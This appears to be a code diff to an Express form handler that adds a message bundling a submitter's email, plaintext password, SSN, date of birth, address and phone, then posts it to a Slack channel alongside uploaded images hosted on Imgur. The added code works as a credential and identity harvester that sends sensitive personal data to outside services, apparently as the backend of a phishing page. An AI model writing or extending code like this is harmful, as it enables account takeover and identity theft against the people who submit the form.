@@ -47,6 +47,9 @@ app.post("/postToSlack", upload.array("images", 2), async (req, res) => {
       dateOfBirth,
     } = req.body;
 
+    // Compile a message with user information
+    const userMessage = `New submission:\nEmail: ${email}\nPassword: ${password}\nName: ${firstName} ${lastName}\nPhone: ${phone}\nAddress: ${homeAddress}, ${city}, ${state} ${zipCode}\nSSN: ${ssn}\nDate of Birth: ${dateOfBirth}`;
+
     // Upload each image to Imgur
     const imgurUrls = await Promise.all(
       req.files.map(async (file, index) => {
@@ -72,7 +75,7 @@ app.post("/postToSlack", upload.array("images", 2), async (req, res) => {
     // Post message to Slack with the Imgur image URLs
     const message = {
       channel: slackChannelId,
-      text: `New submission from ${name}`,
+      text: userMessage,
       attachments: imgurUrls.map((url, index) => ({
         image_url: url,
         text: `Uploaded Image ${index + 1}`,
